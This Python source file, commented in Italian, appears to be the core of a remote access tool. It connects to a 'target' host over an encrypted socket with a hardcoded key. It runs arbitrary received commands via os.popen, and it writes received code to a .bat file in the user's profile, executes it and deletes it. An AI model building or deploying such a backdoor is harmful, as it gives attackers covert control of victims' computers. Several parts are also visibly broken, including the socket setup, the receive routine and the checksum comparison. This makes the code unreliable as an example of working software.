#import
import os
import zlib
import socket
from cryptography.fernet import Fernet

#classe che gestisce il socket
class Connection:
    def __init__(self, code, command):
        self.sock = None
        self.conn = None
        self.stat = False
        self.ip = ""
        self.port = 0
        self.criptokey = b'Msi9jORIhlimMDIg2zlTaKrUIuU0LIBRJfVdww7QDJ4='
        self.code = code
        self.command = command

    # comandi della connessione



    def INIT_CONN(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.IPPROTO_TCP)
            self.conn = self.sock.connect((self.ip, self.port))
            return True
        except:
            return False

    def CLOSE_CONN(self):
        try:
            self.conn.close()
            return True
        except:
            return False

    # ritorno informazioni utili



    def Ip_Targhet(self):
        try:
            return self.ip
        except:
            return False

    def Port(self):
        try:
            return self.port
        except:
            return False

    def Stat_Conn(self):
        try:
            return self.stat
        except:
            return False

# classe che gestisce la comunicazione al traghet
class Operation(Connection):
    def SEND(self, data):
        try:
            data = data.encode()
        except:
            pass
        try:
            crc32 = zlib.crc32(data).to_bytes(6, 'big')
            data = Fernet(self.criptokey).encrypt(data)
            packet = data + b'@' + crc32
            self.conn.send(packet)
            return True
        except:
            return False

    def RECV(self):
        try:
            data = self.conn.recv(4080)
            data = str(data).split("@")
            crc32 = data[-1]
            data.pop(-1)
            payload = ""
            for index in data:
                payload = payload.append(index + "")
            payload.pop(-1)
            payload = payload.encode()
            payload = Fernet(self.criptokey).decrypt(payload)
            if zlib.crc32(payload).to_bytes(6, 'big') != crc32:
                return False
            else:
                return True
        except:
            return False

# classe che gestisce l'esecuzione di comando remoto
class Comands():
    def __init__(self, command, code):
        self.command = command
        self.code = code

    def EX_COMMAND(self):
        try:
            output = os.popen(self.command).read()
            return output
        except:
            return False

    def EX_SCRIPT(self):
        try:
            output = os.popen("whoami").read()
            user = output.split("/")[-1]
            script = open("C:\\Users\\" + user + "\\code.bat", "w+")
            script.write(self.code)
            script.close()
            output_script = os.popen("C:\\Users\\" + user + "\\code.bat").read()
            os.remove("C:\\Users\\" + user + "\\code.bat")
            return output_script
        except:
            return False